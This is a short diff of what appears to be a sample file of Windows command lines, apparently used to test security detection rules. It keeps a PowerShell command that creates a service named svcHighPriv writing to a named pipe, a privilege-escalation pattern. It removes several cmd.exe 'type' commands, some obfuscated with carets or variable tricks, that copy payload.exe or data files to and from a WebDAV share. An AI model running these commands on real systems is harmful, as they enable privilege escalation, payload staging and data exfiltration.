@@ -1,9 +1,1 @@
-"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"  -c New-Service -Name svcHighPriv -BinaryPathName 'C:\windows\system32\cmd.exe /C echo Uuup! > \\.\pipe\HighPriv' -StartupType Manual
-cmd.exe /c set "cmd=type" && call %cmd% \\webdav.server.local\share\file.txt > C:\temp\file.txt
-cmd.exe /c t^y^p^e payload.exe > payload.exe
-cmd.exe /c t^yp^e C:\temp\data.txt > \\webdav.server.local\share\data.txt
-cmd.exe /c type "payload.exe" > payload.exe
-cmd.exe /c type C:\temp\data.txt >\\webdav.server.local\share\data.txt
-cmd.exe /c type payload.exe>>payload.exe
-cmd.exe /c type payload.exe>uploaded.exe
-cmd.exe /c type Procmon.exe>Procmon.exe
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c New-Service -Name svcHighPriv -BinaryPathName 'C:\windows\system32\cmd.exe /C echo Uuup! > \\.\pipe\HighPriv' -StartupType Manual
